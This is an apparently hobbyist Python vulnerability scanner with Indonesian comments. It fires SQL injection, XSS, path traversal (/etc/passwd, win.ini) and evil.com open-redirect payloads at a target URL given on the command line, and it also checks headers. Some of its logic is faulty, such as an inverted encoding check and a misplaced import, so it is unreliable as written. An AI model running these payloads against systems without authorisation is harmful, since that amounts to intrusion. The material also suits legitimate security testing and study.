#!/usr/bin/env python3
# Raps_Vuln_Scanner.py - Advanced Vulnerability Scanner
# Jangan pake buat iseng, hehe tau diri

import socket
import ssl
import requests
import threading
import json
import hashlib
import re
from urllib.parse import urljoin, urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed

class RapsVulnScanner:
    def __init__(self, target_url, threads=50, timeout=5):
        self.target = target_url.rstrip('/')
        self.threads = threads
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Raps-Scanner/1.0 (+https://github.com/raps/tools)',
            'Accept': '*/*'
        })
        self.vulnerabilities = []
        self.parsed = urlparse(target_url)
        self.host = self.parsed.netloc

    def _check_sql_injection(self, url):
        """Deteksi SQL Injection (time-based & error-based)"""
        payloads = [
            "'", "\"", "' OR '1'='1", "'; WAITFOR DELAY '00:00:05'--",
            "' AND SLEEP(5)--", "1' ORDER BY 1--", "' UNION SELECT NULL--"
        ]
        for payload in payloads:
            test_url = f"{url}{payload}"
            try:
                start = time.time()
                resp = self.session.get(test_url, timeout=self.timeout)
                elapsed = time.time() - start
                if elapsed > 4.5 and "sleep" in payload.lower():
                    self.vulnerabilities.append({
                        "type": "SQL Injection (Time-based)",
                        "url": test_url,
                        "payload": payload
                    })
                elif any(err in resp.text.lower() for err in ["mysql", "sql syntax", "ora-", "postgresql", "microsoft ole db"]):
                    self.vulnerabilities.append({
                        "type": "SQL Injection (Error-based)",
                        "url": test_url,
                        "payload": payload
                    })
            except:
                pass

    def _check_xss(self, url):
        """Deteksi Cross-Site Scripting (Reflected & DOM)"""
        payloads = [
            "<script>alert('Raps')</script>",
            "<img src=x onerror=alert(1)>",
            "\"><svg/onload=alert(1)>",
            "'-alert(1)-'",
            "javascript:alert('XSS')"
        ]
        for payload in payloads:
            test_url = f"{url}{payload}"
            try:
                resp = self.session.get(test_url, timeout=self.timeout)
                if payload in resp.text and not self._is_encoded(resp.text, payload):
                    self.vulnerabilities.append({
                        "type": "Cross-Site Scripting (Reflected)",
                        "url": test_url,
                        "payload": payload
                    })
            except:
                pass

    def _is_encoded(self, text, payload):
        """Cek apakah payload di-encode oleh WAF/server"""
        encoded = [payload, payload.replace('<', '%3C'), payload.replace('>', '%3E')]
        return not any(e in text for e in encoded)

    def _check_directory_traversal(self, url):
        """Deteksi Path Traversal / LFI"""
        payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\win.ini",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
            "....//....//....//etc/passwd"
        ]
        indicators = ["root:x:", "[extensions]", "for 16-bit app support"]
        for payload in payloads:
            test_url = f"{url}?file={payload}"
            try:
                resp = self.session.get(test_url, timeout=self.timeout)
                if any(ind in resp.text for ind in indicators):
                    self.vulnerabilities.append({
                        "type": "Path Traversal / LFI",
                        "url": test_url,
                        "payload": payload
                    })
            except:
                pass

    def _check_open_redirect(self, url):
        """Deteksi Open Redirect"""
        payloads = [
            "//evil.com", "https://evil.com", "//google.com@evil.com",
            "/\\evil.com", "?url=evil.com"
        ]
        for payload in payloads:
            test_url = f"{url}?redirect={payload}"
            try:
                resp = self.session.get(test_url, timeout=self.timeout, allow_redirects=False)
                if resp.status_code in [301, 302] and "evil.com" in resp.headers.get('Location', ''):
                    self.vulnerabilities.append({
                        "type": "Open Redirect",
                        "url": test_url,
                        "payload": payload
                    })
            except:
                pass

    def _check_headers_misconfiguration(self):
        """Cek missing security headers"""
        try:
            resp = self.session.get(self.target, timeout=self.timeout)
            headers = resp.headers
            missing = []
            required = ['X-Frame-Options', 'X-Content-Type-Options', 'Strict-Transport-Security', 'Content-Security-Policy']
            for h in required:
                if h not in headers:
                    missing.append(h)
            if missing:
                self.vulnerabilities.append({
                    "type": "Missing Security Headers",
                    "details": missing
                })
        except:
            pass

    def _check_server_info_leak(self):
        """Cek informasi server yang bocor"""
        try:
            resp = self.session.get(self.target, timeout=self.timeout)
            server = resp.headers.get('Server', '')
            powered_by = resp.headers.get('X-Powered-By', '')
            if server:
                self.vulnerabilities.append({
                    "type": "Server Info Disclosure",
                    "details": f"Server: {server}"
                })
            if powered_by:
                self.vulnerabilities.append({
                    "type": "Technology Stack Disclosure",
                    "details": f"X-Powered-By: {powered_by}"
                })
        except:
            pass

    def _check_common_cves(self):
        """Deteksi versi umum dengan CVE (mock)"""
        # Hehe ini cuma contoh, real-nya pake CVE database
        try:
            resp = self.session.get(urljoin(self.target, 'wp-content/'), timeout=self.timeout)
            if resp.status_code == 200:
                self.vulnerabilities.append({
                    "type": "Possible WordPress Install",
                    "risk": "Medium - Plugin version enumeration possible"
                })
        except:
            pass

    def run_full_scan(self):
        """Jalankan semua modul vulnerability scanning"""
        print(f"[Raps] -> Memulai vulnerability scan ke {self.target}")
        # Disini implementasi sebenarnya bakal spider dulu semua endpoint
        # Tapi untuk demo, kita scan base URL + beberapa parameter dummy
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            # SQLi test
            futures.append(executor.submit(self._check_sql_injection, self.target + "?id="))
            futures.append(executor.submit(self._check_sql_injection, self.target + "?search="))
            # XSS test
            futures.append(executor.submit(self._check_xss, self.target + "?q="))
            futures.append(executor.submit(self._check_xss, self.target + "?name="))
            # Path traversal
            futures.append(executor.submit(self._check_directory_traversal, self.target))
            # Open redirect
            futures.append(executor.submit(self._check_open_redirect, self.target))
        
        # Headers & info leak (non-threaded biar gak ribet)
        self._check_headers_misconfiguration()
        self._check_server_info_leak()
        self._check_common_cves()
        
        for future in as_completed(futures):
            pass  # semua sudah append ke self.vulnerabilities
        
        return self.vulnerabilities

    def generate_report(self):
        """Bikin laporan JSON biar keliatan pro"""
        report = {
            "target": self.target,
            "timestamp": time.time(),
            "total_vulnerabilities": len(self.vulnerabilities),
            "findings": self.vulnerabilities
        }
        return json.dumps(report, indent=2)

if __name__ == "__main__":
    import sys, time
    if len(sys.argv) < 2:
        print("Cara pakai: python raps_vuln_scanner.py <target_url>")
        print("Contoh: python raps_vuln_scanner.py https://target.com")
        sys.exit(1)
    
    target = sys.argv[1]
    scanner = RapsVulnScanner(target, threads=30, timeout=5)
    scanner.run_full_scan()
    print(scanner.generate_report())
